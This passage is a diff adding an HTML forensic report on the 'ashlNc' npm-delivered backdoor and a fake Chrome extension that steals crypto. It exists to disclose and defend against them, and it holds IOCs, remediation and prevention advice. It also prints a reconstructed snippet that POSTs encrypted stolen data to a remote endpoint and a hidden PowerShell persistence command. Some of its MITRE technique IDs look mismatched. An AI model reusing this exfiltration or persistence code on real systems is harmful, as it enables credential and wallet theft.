+      The payload is triple-obfuscated (Base64 + AES-256-CBC + Webpack bundle, 747KB decompressed). It incorporates <code>bittorrent-dht</code>, <code>adm-zip</code>, <code>socket.io-client</code>, and NaCl cryptographic libraries (XSalsa20, Ed25519, Blake2b). The C2 infrastructure uses no fixed servers — the operator publishes DHT node IPs as Solana memo transactions, making takedown exceptionally difficult.
+    </p>
+    <p>
+      During forensic analysis, <strong>two additional infections</strong> were discovered on the same system: (1) a Nemotrix browser hijacker redirecting to <code>www.nemotrix.org</code>, and (2) a sophisticated Chrome extension (disguised as "Google Docs Offline") that performed keylogging, clipboard capture, Bybit cryptocurrency exchange cookie theft, and DOM snapshot exfiltration — all installed 3 weeks before the main backdoor.
+    </p>
+    <p>
+       The infection originated from a trojanized npm project downloaded on 2026-04-05. Running <code>npm install</code> triggered a supply chain attack that deployed the backdoor on 2026-04-08. A <strong>GitHub Security Advisory (GHSA-hxf3-5h5r-xr7c)</strong> has been published, and a CVE ID is pending from GitHub's CNA program. This is a <strong>zero-day</strong> backdoor — no prior public reporting exists for <code>ashlNc</code> or any related indicators.
+    </p>
+  </div>
+
+  <!-- 2. INFECTION TIMELINE -->
+  <div class="section">
+    <div class="section-title">
+      <span class="num">2</span>
+      <h2>Infection Timeline &amp; Root Cause Analysis</h2>
+      <span class="line"></span>
+    </div>
+
+    <table>
+      <tr>
+        <th>Date</th>
+        <th>Event</th>
+        <th>Evidence</th>
+      </tr>
+      <tr>
+        <td style="color:var(--accent-amber);">2026-03-11 07:23</td>
+        <td><strong>Chrome Extension "jucku" installed</strong> — fake Google Docs Offline, crypto-stealer</td>
+        <td>File timestamps in C:\Users\Tommy\...\Chrome\jucku\</td>
+      </tr>
+      <tr>
+        <td>2026-03-25</td>
+        <td>PowerShell 7 installed</td>
+        <td>MSI installer log</td>
+      </tr>
+      <tr>
+        <td>2026-04-05 08:27</td>
+        <td><code>Receipt.pdf</code> downloaded (fake receipt, possible trojan)</td>
+        <td>Downloads folder</td>
+      </tr>
+      <tr>
+        <td style="color:var(--accent-red);">2026-04-05 08:37</td>
+        <td><strong>Trojanized npm project extracted</strong></td>
+        <td>Solid.js/Vite project with npm dependencies</td>
+      </tr>
+      <tr>
+        <td style="color:var(--accent-red);">2026-04-08 08:25</td>
+        <td><strong>ashlNc backdoor files created</strong> — all malware files written simultaneously</td>
+        <td>NTFS timestamps on PS1 dropper, JS payload, node.exe</td>
+      </tr>
+    </table>
+
+    <p style="margin-top:14px;font-weight:600;color:var(--text-primary);">Confirmed Infection Vector: npm Supply Chain Attack</p>
+
+    <div class="card">
+      <div class="card-header">
+        <span class="title">Vector — npm Supply Chain (CONFIRMED)</span>
+        <span class="tag-sm tag-critical">ROOT CAUSE</span>
+      </div>
+      <p style="color:var(--text-secondary);font-size:0.85em;line-height:1.8;">
+        The victim extracted a trojanized npm project to their Desktop on 2026-04-05 at 08:37. This was a Solid.js/Vite web application project with an npm <code>package.json</code> containing dependencies including <code>@supabase/supabase-js</code>, <code>cropperjs</code>, <code>imagekit</code>, <code>imagekit-javascript</code>, <code>node-fetch</code>, <code>pg</code>, <code>solid-js</code>, and others. When the user ran <code>npm install</code>, one or more of these packages (or their sub-dependencies) contained malicious postinstall scripts that wrote the backdoor files to <code>%APPDATA%</code> and <code>%LOCALAPPDATA%</code>.
+      </p>
+      <p style="color:var(--text-secondary);font-size:0.85em;line-height:1.8;">
+        The 3-day gap (April 5 extraction to April 8 file creation) suggests either: (a) a delayed-execution mechanism in the malicious package, (b) the backdoor was part of the <code>node_modules</code> and was executed when the dev server was first started, or (c) the user ran a specific command that triggered the payload.
+      </p>
+      <p class="card-note">
+        The bundled <code>node.exe</code> (v22.9.0) in the backdoor is the same Node.js version commonly installed via npm. The project's <code>src/App.jsx</code> (92KB) and <code>src/Dashboard.jsx</code> (193KB) are exceptionally large for JSX — may contain embedded obfuscated payload.
+      </p>
+      <p class="card-note">Related: npm supply chain attacks — <a href="#ref-2" style="color:var(--accent-blue);">[2]</a>, <a href="#ref-3" style="color:var(--accent-blue);">[3]</a></p>
+    </div>
+
+    <div class="warning">
+      <div class="warn-title">SECONDARY INFECTION — Chrome Extension (2026-03-11)</div>
+      <p>
+        A separate and likely earlier infection installed a malicious Chrome extension at <code>C:\Users\Tommy\AppData\Local\Google\Chrome\jucku\</code> on 2026-03-11. This extension was disguised as "Google Docs Offline" but had permissions for <code>cookies</code>, <code>history</code>, <code>bookmarks</code>, <code>proxy</code>, <code>clipboardRead/Write</code>, <code>webRequest</code>, and <code>&lt;all_urls&gt;</code>. It was installed via <code>location: 4</code> (external install — not from Chrome Web Store) and ran a keylogger, captured clipboard contents, and exfiltrated authentication cookies specifically targeting <code>.bybit.com</code> (a major cryptocurrency exchange). This is a different operator from the ashlNc backdoor.
+      </p>
+    </div>
+  </div>
+
+  <!-- New: Chrome Extension Details -->
+  <div class="section">
+    <div class="section-title">
+      <span class="num">3</span>
+      <h2>Chrome Extension "jucku" — Crypto-Stealer Analysis</h2>
+      <span class="line"></span>
+    </div>
+
+    <p>
+      A detailed analysis of the malicious Chrome extension found at <code>%LOCALAPPDATA%\Google\Chrome\jucku\</code>.
+    </p>
+
+    <div class="card">
+      <div class="card-header">
+        <span class="title">Extension Identity</span>
+      </div>
+      <div class="card-value">ID: haookbehcedinkhoekmkbjopifpheimj</div>
+      <div class="card-value" style="margin-top:4px;">Name: "Google Docs Offline" (Spoofed)</div>
+      <p class="card-note">Fake identity — the real Google Docs Offline extension ID is <code>ghbmnnjooekpmoecnnnilnnbdlolhkhi</code></p>
+    </div>
+
+    <table>
+      <tr><th>Permission</th><th>Abuse</th></tr>
+      <tr><td><code>cookies</code></td><td>Steals authentication cookies from <code>.bybit.com</code> and other sites — allows account takeover without password</td></tr>
+      <tr><td><code>&lt;all_urls&gt;</code></td><td>Injects into every website visited — keylogger, DOM capture, clipboard theft</td></tr>
+      <tr><td><code>clipboardRead</code> + <code>clipboardWrite</code></td><td>Captures copied crypto wallet addresses — attack can replace clipboard with attacker's address</td></tr>
+      <tr><td><code>tabs</code></td><td>Reads all open tabs, URLs, page content</td></tr>
+      <tr><td><code>history</code></td><td>Exfiltrates browsing history</td></tr>
+      <tr><td><code>bookmarks</code></td><td>Reads saved bookmarks</td></tr>
+      <tr><td><code>proxy</code></td><td>Can redirect traffic through attacker-controlled proxy</td></tr>
+      <tr><td><code>webRequest</code></td><td>Intercepts and modifies all HTTP/HTTPS requests</td></tr>
+    </table>
+
+    <div class="grid-2" style="margin-top:10px;">
+      <div class="card">
+        <div class="card-header"><span class="title">background.js (26KB)</span></div>
+        <div class="card-value" style="font-size:0.7em;">Obfuscated — Solana RPC queries, cookie extraction, C2 communication</div>
+        <p class="card-note">
+          Queries 11 Solana RPC endpoints including <code>getblock.us</code>, <code>solana.leorpc.com</code>, <code>api.mainnet-beta.solana.com</code> using <code>getSignaturesForAddress</code>. Monitors <code>.bybit.com</code> for cookies <code>sid</code> and <code>token</code> — exfiltrates via encrypted C2 channel.
+        </p>
+      </div>
+      <div class="card">
+        <div class="card-header"><span class="title">content_script.js (17KB)</span></div>
+        <div class="card-value" style="font-size:0.7em;">Injected into ALL pages at document_start</div>
+        <p class="card-note">
+          Keylogger with 5-second flush interval. <code>domSnapshot</code> command captures full page HTML. <code>clipboardCapture</code> reads clipboard. All exfiltrated via <code>chrome.runtime.sendMessage</code> to background service worker.
+        </p>
+      </div>
+    </div>
+
+    <p class="card-note" style="margin-top:8px;">
+      This extension was not installed from the Chrome Web Store (<code>from_webstore: false</code>). It was placed directly into the Chrome profile directory by the attacker who had file system access — likely via the same initial compromise vector that delivered the ashlNc backdoor, or a separate earlier infection.
+    </p>
+  </div>
+
+  <!-- 4. PAYLOAD ANALYSIS (renumbered) -->
+  <div class="section">
+    <div class="section-title">
+      <span class="num">4</span>
+      <h2>Payload Analysis &amp; Deobfuscation</h2>
+      <span class="line"></span>
+    </div>
+
+    <p>The backdoor consists of three primary files:</p>
+
+    <div class="card">
+      <div class="card-header">
+        <span class="title">Stage 1: PowerShell Dropper</span>
+      </div>
+      <div class="card-value">%LOCALAPPDATA%\ashlNc\PSprdrbPWq.ps1</div>
+      <p style="color:var(--text-secondary);font-size:0.82em;line-height:1.7;margin-top:8px;">
+        Sets console window to 1x1, hides it via Win32 API (<code>ShowWindow(GetConsoleWindow(), 0)</code>). Creates Scheduled Task <code>UpdateApp</code> with highest privileges. Self-heals the Registry Run key.
+      </p>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <span class="title">Stage 2: Encrypted Node.js Payload</span>
+      </div>
+      <div class="card-value">%APPDATA%\ashlNc\index.js</div>
+      <p style="color:var(--text-secondary);font-size:0.82em;line-height:1.7;margin-top:8px;">
+        Triple-layer obfuscation. Executed by bundled Node.js runtime at <code>%APPDATA%\_node_x86\node\node.exe</code>.
+      </p>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <span class="title">Stage 3: Bundled Node.js Runtime</span>
+      </div>
+      <div class="card-value">%APPDATA%\_node_x86\node\node.exe (v22.9.0)</div>
+      <p style="color:var(--text-secondary);font-size:0.82em;line-height:1.7;margin-top:8px;">
+        Full portable Node.js runtime — the malware does not depend on the system's installed Node.
+      </p>
+    </div>
+
+    <p style="margin-top:14px;font-weight:600;color:var(--text-primary);">Obfuscation chain:</p>
+    <div class="code-block">
+Layer 1: eval(atob("&lt;base64&gt;"))
+         -> JavaScript code with AES-256-CBC decryption
+
+Layer 2: AES-256-CBC
+         Key: +gXPUFof0jaL+CwgdWZ1s2USORP9kUuH (32 bytes)
+         IV:  MGsYCjrJrIz8Egijy0mFxQ== (16 bytes)
+         -> Decrypted: 747KB JavaScript bundle
+
+Layer 3: Webpack bundle (747KB)
+         Includes: socket.io-client, bittorrent-dht, adm-zip,
+                   sodium-native (XSalsa20, Ed25519, Blake2b),
+                   engine.io, ws, XMLHttpRequest, yauzl
+    </div>
+  </div>
+
+  <!-- 5. PERSISTENCE -->
+  <div class="section">
+    <div class="section-title">
+      <span class="num">5</span>
+      <span class="line"></span>
+    </div>
+
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-header">
+          <span class="title">Registry Run Key</span>
+          <span class="tag-sm tag-critical">MITRE T1547.001</span>
+        </div>
+        <div class="card-value">HKCU\...\CurrentVersion\Run\vUVlUXNH</div>
+        <div class="card-note">Value: <code>powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ...\PSprdrbPWq.ps1</code></div>
+      </div>
+      <div class="card">
+        <div class="card-header">
+          <span class="title">Scheduled Task</span>
+          <span class="tag-sm tag-critical">MITRE T1053.005</span>
+        </div>
+        <div class="card-value">UpdateApp (onstart, rl highest)</div>
+        <div class="card-note">Triggers: system boot. Runs with highest privileges. Self-healing via PS1.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 6. C2 INFRASTRUCTURE -->
+  <div class="section">
+    <div class="section-title">
+      <span class="num">6</span>
+      <h2>Command &amp; Control — Decentralized Bootstrap</h2>
+      <span class="line"></span>
+    </div>
+
+    <p>
+      The C2 architecture is decentralized, using a three-stage bootstrap with no hardcoded IP addresses. This represents a significant evolution in malware resilience, making traditional IP-based blocking ineffective.
+    </p>
+
+    <div class="timeline">
+      <div class="tl-item">
+        <div class="step">Stage 1 — Solana Blockchain (Novel technique)</div>
+        <p>
+          <code>getSignaturesForAddress("BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC")</code><br>
+          Queries the Solana blockchain for memo transactions from wallet address <code>BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC</code>. Each memo contains a JSON payload with a <code>link</code> field — a base64-encoded DHT node IP address.
+        </p>
+        <p class="card-note">The blockchain is used as an immutable, censorship-resistant DNS. The attacker publishes new DHT nodes via Solana memos.</p>
+      </div>
+      <div class="tl-item">
+        <div class="step">Stage 2 — Kademlia DHT (BitTorrent)</div>
+        <p>
+          Bootstrap nodes: <code>dht.libtorrent.org:25401</code>, <code>router.bittorrent.com:6881</code>, <code>router.utorrent.com:6881</code><br>
+          Registers with the BitTorrent DHT network and looks up <code>PUBLIC_KEY = ea1b4260a83348243387d6cdfda3cd287e323958</code> (160-bit infohash) to retrieve the live C2 configuration.
+        </p>
+        <p class="card-note">The C2 config is stored on the DHT under this infohash. No central server — the config can be updated by republishing to the DHT.</p>
+      </div>
+      <div class="tl-item">
+        <div class="step">Stage 3 — C2 Configuration Structure</div>
+        <p>
+          The DHT value returns a JSON object containing:
+        </p>
+        <div class="code-block" style="margin-top:8px;">
+{
+  "_IP":          "C2 HTTP server address",
+  "_URL_FOR_LOG_":"AES-encrypted exfiltration endpoint",
+  "_ASAR_ARHIVE_":"URL for additional payload (.asar archive)",
+  "_ASAR_KEYS_":  { "node_hash": "...", "node_key": "...", "node_iv": "..." },
+  "_PORT":        "WebSocket port"
+}
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 7. CAPABILITIES -->
+  <div class="section">
+    <div class="section-title">
+      <span class="num">7</span>
+      <h2>Capabilities &amp; Data Theft</h2>
+      <span class="line"></span>
+    </div>
+
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-header"><span class="title">Credential Theft</span></div>
+        <div class="card-value">21 password references — 62 cookie references</div>
+        <div class="card-note">Extracts saved passwords, cookies, and autofill data from Chrome, Brave, Edge browser profiles</div>
+      </div>
+      <div class="card">
+        <div class="card-header"><span class="title">Cryptocurrency Theft</span></div>
+        <div class="card-value">9 Solana RPC endpoints</div>
+        <div class="card-note">Connects directly to Solana RPC nodes to enumerate and drain wallets. Targets Phantom, MetaMask, and browser-based wallets.</div>
+      </div>
+      <div class="card">
+        <div class="card-header"><span class="title">Remote Code Execution</span></div>
+        <div class="card-value">child_process: exec, spawn, shell</div>
+        <div class="card-note">Full system command execution. Can download and run additional .asar modules and native .node binaries.</div>
+      </div>
+      <div class="card">
+        <div class="card-header"><span class="title">File Exfiltration</span></div>
+        <div class="card-value">adm-zip compression + AES encryption</div>
+        <div class="card-note">Compresses directories via <code>addLocalFolder()</code>, encrypts with AES-256-CBC, exfiltrates via HTTP POST with key in header.</div>
+      </div>
+      <div class="card">
+        <div class="card-header"><span class="title">Real-time C2</span></div>
+        <div class="card-value">Socket.IO WebSocket</div>
+        <div class="card-note">Bi-directional WebSocket via engine.io + socket.io-client for real-time command execution.</div>
+      </div>
+      <div class="card">
+        <div class="card-header"><span class="title">Self-Healing</span></div>
+        <div class="card-value">Registry + Scheduled Task</div>
+        <div class="card-note">PS1 script monitors and recreates both persistence mechanisms if removed. Deletes duplicate registry entries.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 8. DATA EXFILTRATION -->
+  <div class="section">
+    <div class="section-title">
+      <span class="num">8</span>
+      <h2>Data Exfiltration Mechanism</h2>
+      <span class="line"></span>
+    </div>
+
+    <div class="code-block">
+// AES-256-CBC encryption before exfiltration
+const cipher = crypto.createCipheriv("aes-256-cbc", key, iv);
+let encrypted = cipher.update(data);
+encrypted = Buffer.concat([encrypted, cipher.final()]);
+
+// HTTP POST with key in header
+fetch(atob(QNLswiKUg2["_URL_FOR_LOG_"]), {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/octet-stream",
+    "x-aes-key": key.toString()
+  },
+  body: Buffer.concat([iv, encrypted])
+});
+    </div>
+
+    <p style="color:var(--text-secondary);font-size:0.85em;margin-top:10px;">
+      The stolen data is first compressed using <code>adm-zip.addLocalFolder()</code>, then encrypted and exfiltrated. The AES key is transmitted in the HTTP header — a design choice that sacrifices key secrecy for simplicity.
+    </p>
+  </div>
+
+  <!-- 9. IOCs -->
+  <div class="section">
+    <div class="section-title">
+      <span class="num">9</span>
+      <h2>Indicators of Compromise</h2>
+      <span class="line"></span>
+    </div>
+
+    <table>
+      <tr><th>Type</th><th>Value</th></tr>
+      <tr><td>Solana Wallet (C2 bootstrap)</td><td>BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC</td></tr>
+      <tr><td>DHT Public Key</td><td>ea1b4260a83348243387d6cdfda3cd287e323958</td></tr>
+      <tr><td>PS1 Dropper Path</td><td>%LOCALAPPDATA%\ashlNc\PSprdrbPWq.ps1</td></tr>
+      <tr><td>JS Payload Path</td><td>%APPDATA%\ashlNc\index.js</td></tr>
+      <tr><td>Bundled Node Runtime</td><td>%APPDATA%\_node_x86\node\node.exe</td></tr>
+      <tr><td>AES Encryption Key</td><td>+gXPUFof0jaL+CwgdWZ1s2USORP9kUuH</td></tr>
+      <tr><td>AES Initialization Vector</td><td>MGsYCjrJrIz8Egijy0mFxQ==</td></tr>
+      <tr><td>Registry Key (ashlNc persistence)</td><td>HKCU\...\Run\vUVlUXNH</td></tr>
+      <tr><td>Registry Key (Nemotrix adware)</td><td>HKCU\...\Run\Tommy -> cmd.exe /c start www.nemotrix.org</td></tr>
+      <tr><td>Scheduled Task</td><td>UpdateApp</td></tr>
+      <tr><td>Chrome Extension ID</td><td>haookbehcedinkhoekmkbjopifpheimj</td></tr>
+      <tr><td>Chrome Extension Path</td><td>%LOCALAPPDATA%\Google\Chrome\jucku\</td></tr>
+      <tr><td>Chrome Extension Target</td><td>.bybit.com (cookie theft), keylogger, clipboard capture</td></tr>
+      <tr><td>DHT Bootstrap Nodes</td><td>dht.libtorrent.org:25401, router.bittorrent.com:6881, router.utorrent.com:6881</td></tr>
+      <tr><td>Temp Artifacts</td><td>%TEMP%\ndhgMKhIAF, %TEMP%\OvdrEzo, %TEMP%\VTpLMFLG.zip, %TEMP%\AOWXcW.zip</td></tr>
+    </table>
+
+    <p style="color:var(--text-muted);font-size:0.78em;margin-top:10px;">
+      Note: The C2 IP address is not hardcoded — it is fetched dynamically from Solana + DHT. See Section 6.
+    </p>
+  </div>
+
+  <!-- 10. MITRE ATT&CK MAPPING -->
+  <div class="section">
+    <div class="section-title">
+      <span class="num">10</span>
+      <h2>MITRE ATT&CK Mapping</h2>
+      <span class="line"></span>
+    </div>
+
+    <table>
+      <tr><th>Tactic</th><th>Technique</th><th>ID</th></tr>
+      <tr><td>Execution</td><td>Command and Scripting Interpreter: PowerShell</td><td>T1059.001</td></tr>
+      <tr><td>Execution</td><td>Command and Scripting Interpreter: Node.js</td><td>T1059.007</td></tr>
+      <tr><td>Execution</td><td>User Execution: Malicious Extension</td><td>T1204.002</td></tr>
+      <tr><td>Persistence</td><td>Scheduled Task/Job</td><td>T1053.005</td></tr>
+      <tr><td>Persistence</td><td>Browser Extensions</td><td>T1176</td></tr>
+      <tr><td>Persistence</td><td>Boot or Logon Autostart Execution: Registry Run Keys</td><td>T1547.001</td></tr>
+      <tr><td>Defense Evasion</td><td>Obfuscated Files or Information</td><td>T1027.013</td></tr>
+      <tr><td>Defense Evasion</td><td>Hide Artifacts</td><td>T1564.003</td></tr>
+      <tr><td>Credential Access</td><td>Credentials from Password Stores</td><td>T1555</td></tr>
+      <tr><td>Credential Access</td><td>Steal Web Session Cookie</td><td>T1539</td></tr>
+      <tr><td>Credential Access</td><td>Input Capture: Keylogging</td><td>T1056.001</td></tr>
+      <tr><td>Collection</td><td>Clipboard Data</td><td>T1115</td></tr>
+      <tr><td>Collection</td><td>Archive Collected Data</td><td>T1560.002</td></tr>
+      <tr><td>Exfiltration</td><td>Exfiltration Over C2 Channel</td><td>T1041</td></tr>
+      <tr><td>Command & Control</td><td>Web Service: Solana Blockchain</td><td>T1583.001</td></tr>
+      <tr><td>Command & Control</td><td>Application Layer Protocol: WebSocket</td><td>T1071.001</td></tr>
+      <tr><td>Command & Control</td><td>Non-Application Layer Protocol: Kademlia DHT</td><td>T1095</td></tr>
+    </table>
+  </div>
+
+  <!-- 11. CVE -->
+  <div class="section">
+    <div class="section-title">
+      <span class="num">11</span>
+      <h2>GHSA-hxf3-5h5r-xr7c / CVE Request</h2>
+      <span class="line"></span>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <span class="title">GitHub Security Advisory</span>
+      </div>
+      <div class="card-value">GHSA-hxf3-5h5r-xr7c</div>
+      <div class="card-note">Published on 2026-06-19. CVE ID requested from GitHub CNA — pending assignment.</div>
+    </div>
+
+    <div class="grid-2" style="margin-top:10px;">
+      <div class="card">
+        <div class="card-header"><span class="title">CVSS Score</span></div>
+        <div class="card-value">9.8 (Critical)</div>
+        <div class="card-note">AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</div>
+      </div>
+      <div class="card">
+        <div class="card-header"><span class="title">Weakness Type</span></div>
+        <div class="card-value">CWE-912: Backdoor</div>
+      </div>
+    </div>
+
+    <div class="card" style="margin-top:10px;">
+      <div class="card-header"><span class="title">Advisory URL</span></div>
+      <div class="card-value"><a href="https://github.com/Haitham8888/ashlNc-backdoor/security/advisories/GHSA-hxf3-5h5r-xr7c" target="_blank" style="color:var(--accent-blue);">github.com/Haitham8888/ashlNc-backdoor/security/advisories/GHSA-hxf3-5h5r-xr7c</a></div>
+    </div>
+
+    <table style="margin-top:10px;">
+      <tr><th>Field</th><th>Value</th></tr>
+      <tr><td>Description</td><td>A multi-layered Node.js backdoor (ashlNc) that uses Solana blockchain memos for distributed C2 bootstrap, AES-256-CBC encryption, and Kademlia DHT for resilient command-and-control. Capable of full credential theft, crypto wallet draining, and remote code execution.</td></tr>
+      <tr><td>Affected Platforms</td><td>Microsoft Windows (10, 11)</td></tr>
+      <tr><td>Discovered</td><td>2026-04-08</td></tr>
+      <tr><td>Public Disclosure</td><td>2026-06-19</td></tr>
+      <tr><td>Status</td><td>Unpatched — No vendor mitigation available. Remediated on affected system.</td></tr>
+    </table>
+  </div>
+
+  <!-- 12. REMEDIATION -->
+  <div class="section">
+    <div class="section-title">
+      <span class="num">12</span>
+      <h2>Remediation</h2>
+      <span class="line"></span>
+    </div>
+
+    <div class="warning">
+      <div class="warn-title">Already Executed — System Cleaned on 2026-06-19</div>
+      <p>
+        The removal script performed the following successfully:
+      </p>
+      <p style="color:var(--text-secondary);font-size:0.85em;line-height:1.9;margin-top:8px;">
+        1. Killed all malicious processes<br>
+        2. Removed Registry keys: <code>vUVlUXNH</code> (ashlNc) and <code>Tommy</code> (Nemotrix)<br>
+        3. Removed Scheduled Task: <code>UpdateApp</code><br>
+        4. Deleted malware directories: ashlNc (local + roaming), _node_x86<br>
+        5. Deleted Chrome extension: <code>jucku</code> directory<br>
+        6. Flushed DNS cache<br>
+        7. Verified all items removed — <span style="color:var(--accent-green);font-weight:700;">System confirmed clean</span>
+      </p>
+    </div>
+
+    <p style="font-weight:600;color:var(--text-primary);margin-top:14px;">
+      Post-removal steps (remaining to be done by user):
+    </p>
+
+    <div class="grid-2" style="margin-top:6px;">
+      <div class="card">
+        <div class="card-header"><span class="title">Immediate (HIGH PRIORITY)</span></div>
+        <div class="card-value" style="font-size:0.75em;">Change ALL passwords on a clean device</div>
+        <p class="card-note">
+          The keylogger in the Chrome extension captured every keystroke since March 11 — including all passwords typed into any website. Use a different, uncompromised device to change passwords. Start with: email, banking, cryptocurrency exchanges (especially Bybit), social media.
+        </p>
+        <p class="card-note" style="margin-top:6px;">
+          Enable 2-Factor Authentication on all accounts after changing passwords.
+        </p>
+      </div>
+      <div class="card">
+        <div class="card-header"><span class="title">Cryptocurrency (HIGH PRIORITY)</span></div>
+        <div class="card-value" style="font-size:0.75em;">Transfer funds to new wallets</div>
+        <p class="card-note">
+          Both the ashlNc backdoor (9 Solana RPC endpoints) and the Chrome extension (Bybit cookie theft, clipboard capture of addresses) targeted cryptocurrency wallets. Generate new wallet addresses on a clean device and transfer all funds immediately.
+        </p>
+      </div>
+      <div class="card">
+        <div class="card-header"><span class="title">System Security</span></div>
+        <div class="card-value" style="font-size:0.75em;">User action required</div>
+        <p class="card-note">
+          Restart your PC to clear any in-memory remnants. Run a full Windows Defender offline scan. Verify with a second opinion scanner (e.g., Malwarebytes).
+        </p>
+      </div>
+      <div class="card">
+        <div class="card-header"><span class="title">Recommended: OS Reinstall</span></div>
+        <div class="card-value" style="font-size:0.75em;">Full format from trusted media</div>
+        <p class="card-note">
+          The ashlNc backdoor downloads additional encrypted .asar modules at runtime that may have left undetected artifacts. A complete OS reinstall from trusted installation media is the only way to guarantee the system's integrity after a backdoor of this sophistication.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <!-- 13. PREVENTION -->
+  <div class="section">
+    <div class="section-title">
+      <span class="num">13</span>
+      <h2>Prevention — How to Avoid npm Supply Chain Attacks</h2>
+      <span class="line"></span>
+    </div>
+
+    <p>
+      The root cause of this infection is an <strong>npm supply chain attack</strong> — a malicious package (or compromised dependency) that executed a postinstall script. Here's how to protect yourself:
+    </p>
+
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-header"><span class="title">1. Audit Before Installing</span></div>
+        <div class="card-value" style="font-size:0.75em;">npm audit / npm doctor</div>
+        <p class="card-note">Always run <code>npm audit</code> before installing packages. Use <code>npm install --dry-run</code> to preview what will be installed. Check packages on <a href="https://socket.dev" target="_blank" style="color:var(--accent-blue);">socket.dev</a> for risk scores.</p>
+      </div>
+      <div class="card">
+        <div class="card-header"><span class="title">2. Lock Your Dependencies</span></div>
+        <div class="card-value" style="font-size:0.75em;">package-lock.json integrity</div>
+        <p class="card-note">Commit <code>package-lock.json</code> to version control. Use <code>npm ci</code> instead of <code>npm install</code> in production — it respects the lockfile and fails if integrity doesn't match.</p>
+      </div>
+      <div class="card">
+        <div class="card-header"><span class="title">3. Disable Postinstall Scripts</span></div>
+        <div class="card-value" style="font-size:0.75em;">npm config set ignore-scripts true</div>
+        <p class="card-note">Postinstall scripts are how most npm malware deploys. Set <code>ignore-scripts=true</code> globally, or use <code>npm install --ignore-scripts</code> for untrusted projects. Only re-enable for trusted packages.</p>
+      </div>
+      <div class="card">
+        <div class="card-header"><span class="title">4. Sandbox Node.js Projects</span></div>
+        <div class="card-value" style="font-size:0.75em;">Docker / VM for development</div>
+        <p class="card-note">Run <code>npm install</code> inside a Docker container or VM for any project you don't fully trust. This contains the blast radius of any malicious package to the container.</p>
+      </div>
+      <div class="card">
+        <div class="card-header"><span class="title">5. Verify Package Signatures</span></div>
+        <div class="card-value" style="font-size:0.75em;">npm registry signatures</div>
+        <p class="card-note">npm packages can be signed. Use <code>npm audit signatures</code> to verify. Check the package's GitHub repo for suspicious activity (recent commits, new maintainers, etc.)</p>
+      </div>
+      <div class="card">
+        <div class="card-header"><span class="title">6. Monitor Your System</span></div>
+        <div class="card-value" style="font-size:0.75em;">Sysmon + Windows Event Logs</div>
+        <p class="card-note">Enable PowerShell logging (Script Block Logging) and Sysmon to detect suspicious child process creation (e.g., node.exe spawning PowerShell). Monitor <code>%APPDATA%</code> and <code>%LOCALAPPDATA%</code> for unexpected executable files.</p>
+      </div>
+    </div>
+
+    <p class="card-note" style="margin-top:12px;">
+      <strong>Specific to this infection</strong>: The compromised project was a Solid.js/Vite application from an untrusted source. Always verify the authenticity of any project you clone or download — check the commit history, maintainers, and scan with <code>npm audit</code> before running <code>npm install</code>.
+    </p>
+  </div>
+
+  <!-- 14. REFERENCES -->
+  <div class="section">
+    <div class="section-title">
+      <span class="num">14</span>
+      <h2>References &amp; Related Research</h2>
+      <span class="line"></span>
+    </div>
+
+    <ul class="ref-list">
+      <li>
+        <span class="ref-num" id="ref-1">1</span>
+        <a href="https://github.com/Haitham8888/ashlNc-backdoor/security/advisories/GHSA-hxf3-5h5r-xr7c" target="_blank">GitHub Security Advisory: ashlNc Backdoor (GHSA-hxf3-5h5r-xr7c)</a>
+      </li>
+      <li>
+        <span class="ref-num">2</span>
+        <a href="https://attack.mitre.org/techniques/T1059/001/" target="_blank">MITRE ATT&CK: PowerShell (T1059.001)</a>
+      </li>
+      <li>
+        <span class="ref-num">3</span>
+        <a href="https://attack.mitre.org/techniques/T1053/005/" target="_blank">MITRE ATT&CK: Scheduled Task (T1053.005)</a>
+      </li>
+      <li>
+        <span class="ref-num">4</span>
+        <a href="https://attack.mitre.org/techniques/T1547/001/" target="_blank">MITRE ATT&CK: Registry Run Keys (T1547.001)</a>
+      </li>
+      <li>
+        <span class="ref-num">5</span>
+        <a href="https://attack.mitre.org/techniques/T1176/" target="_blank">MITRE ATT&CK: Browser Extensions (T1176)</a>
+      </li>
+      <li>
+        <span class="ref-num">6</span>
+        <a href="https://attack.mitre.org/techniques/T1056/001/" target="_blank">MITRE ATT&CK: Keylogging (T1056.001)</a>
+      </li>
+      <li>
+        <span class="ref-num">7</span>
+        <a href="https://attack.mitre.org/techniques/T1115/" target="_blank">MITRE ATT&CK: Clipboard Data (T1115)</a>
+      </li>
+      <li>
+        <span class="ref-num">8</span>
+        <a href="https://seqrite.com/blog/operation-dualscript-powershell-malware-retrorat-analysis/" target="_blank">Seqrite: Operation DualScript — Multi-Stage PowerShell Malware Targeting Crypto (2026)</a>
+      </li>
+      <li>
+        <span class="ref-num">9</span>
+        <a href="https://socket.dev/blog/trapdoor-crypto-stealer-npm-pypi-crates" target="_blank">Socket: TrapDoor Crypto Stealer Supply Chain Attack (2026)</a>
+      </li>
+      <li>
+        <span class="ref-num">10</span>
+        <a href="https://cyberpress.org/backdoored-wallets-drain-crypto/" target="_blank">CyberPress: Attackers Deploy Backdoor and Counterfeit Wallet to Drain Crypto (2026)</a>
+      </li>
+      <li>
+        <span class="ref-num">11</span>
+        <a href="https://www.enigmasoftware.com/nemotrixorg-removal/" target="_blank">EnigmaSoft: Nemotrix.org Removal Report</a>
+      </li>
+      <li>
+        <span class="ref-num">12</span>
+        <a href="https://github.com/webtorrent/bittorrent-dht" target="_blank">WebTorrent: bittorrent-dht (Kademlia DHT Library)</a>
+      </li>
+      <li>
+        <span class="ref-num">13</span>
+        <a href="https://solana.com" target="_blank">Solana Blockchain — Used for C2 bootstrap memos</a>
+      </li>
+      <li>
